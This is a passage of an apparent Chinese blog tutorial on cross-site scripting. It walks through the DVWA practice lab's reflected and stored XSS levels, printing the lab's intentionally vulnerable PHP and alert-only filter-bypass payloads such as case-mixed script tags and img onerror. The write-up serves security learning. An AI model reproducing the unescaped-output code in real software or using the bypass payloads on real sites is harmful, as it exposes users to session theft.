    <content type="html"><![CDATA[<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>XSS，跨站脚本，Cross-site scripting。 XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。</p><h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><p>XSS大致可分为反射、存储、DOM三种类型。</p><ol><li>反射型：攻击代码在URL里，输出在HTTP响应中</li><li>存储型：攻击代码在数据库里，输出在HTTP响应中</li><li>DOM型：攻击代码在URL里，输出在DOM节点中。</li></ol><h2 id="整体攻击思路"><a href="#整体攻击思路" class="headerlink" title="整体攻击思路"></a>整体攻击思路</h2><p>角色定义：用户、攻击者、正常服务器、恶意服务器</p><ol><li>攻击者发送带有XSS的恶意URL给用户</li><li>用户点击URL，访问正常服务器</li><li>正常服务器返回了对XSS脚本的响应</li><li>在用户不知情的情况下，用户浏览器执行了返回的XSS脚本，发送会话给恶意服务器</li><li>攻击者从恶意服务器中接受的请求中获取了会话信息(Cookie等)</li><li>攻击者使用用户的身份，登录到正常服务器，相当于劫持了用户会话</li></ol><p><img src="/../img/XSS%E6%BC%8F%E6%B4%9E/16998361139181.png" alt="img"></p><h2 id="DVWA靶场xss练习"><a href="#DVWA靶场xss练习" class="headerlink" title="DVWA靶场xss练习"></a>DVWA靶场xss练习</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><h4 id="low"><a href="#low" class="headerlink" title="low"></a>low</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-variable">$html</span> .= <span class="hljs-string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>没有任何过滤</p><p>payload：</p><p><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><h4 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;Hello <span class="hljs-subst">&#123;$name&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>&lt;script&gt;</code>过滤1次。</p><p>payload：</p><p><code>&lt;scr&lt;script&gt;ipt&gt;alert(/xss/)&lt;/script&gt;</code><br><code>&lt;ScRiPt&gt;alert(/xss/)&lt;/script&gt;</code></p><h4 id="high"><a href="#high" class="headerlink" title="high"></a>high</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">preg_replace</span>( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;Hello <span class="hljs-subst">&#123;$name&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>匹配<code>&lt;</code>、<code>s</code>、<code>c</code>、<code>r</code>、<code>i</code>、<code>p</code>、<code>t</code>、<code>&gt;</code>字符</p><p>payload：</p><p><code>&lt;img src=x onerror=alert(1)&gt;</code><br><code>&lt;iframe onload=alert(1)&gt;</code></p><h4 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;Hello <span class="hljs-subst">&#123;$name&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>htmlspecialchars()</code>转义特殊字符（默认不转义<code>&#39;</code>，但是这里是转义的了）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Plain">&amp;----&amp;amp;<br>&quot;-----&amp;quot;<br>&#x27;------&amp;apos;<br>&lt;-----&amp;lt<br>&gt;-----&amp;gt;<br></code></pre></td></tr></table></figure><p>转义后无法解析为html元素，无法xss</p><h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><p>存储型跟反射型的利用基本一致。但是存储型的XSS会存在数据库，弹窗会一直存在</p><h4 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$message</span> );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>trim</code>过滤预定义字符(<code>\t</code>、<code>\n</code>等)，<code>mysqli_real_escape_string</code>过滤<code>&#39;</code>、<code>&quot;</code>、<code>\x00</code>、<code>\n</code>等</p><p>但没怎么过滤xss语句直接插入数据库中</p><p>payload：</p><p><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><h4 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">strip_tags</span>( <span class="hljs-title function_ invoke__">addslashes</span>( <span class="hljs-variable">$message</span> ) );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );<br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>对<code>$message</code>做了<code>htmlspecialchars()</code>限制，但是对<code>$name</code>未作过多的限制，只使用了<code>str_replace()</code>过滤字符<code>&lt;script&gt;</code></p><p>payload：</p><p><code>&lt;ScRiPt&gt;alert(/xss/)&lt;/script&gt;</code></p><h4 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">strip_tags</span>( <span class="hljs-title function_ invoke__">addslashes</span>( <span class="hljs-variable">$message</span> ) );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">preg_replace</span>( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );<br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>对<code>$message</code>做了<code>htmlspecialchars()</code>限制，但是对<code>$name</code>未作过多的限制，只使用了<code>str_replace()</code>过滤字符<code>&lt;</code>、<code>s</code>、<code>c</code>、<code>r</code>、<code>i</code>、<code>p</code>、<code>t</code>、<code>&gt;</code></p><p>payload：</p><p><code>&lt;img src=x onerror=alert(1)&gt;</code></p><h4 id="impossible-1"><a href="#impossible-1" class="headerlink" title="impossible"></a>impossible</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$message</span> );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$name</span> );<br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ 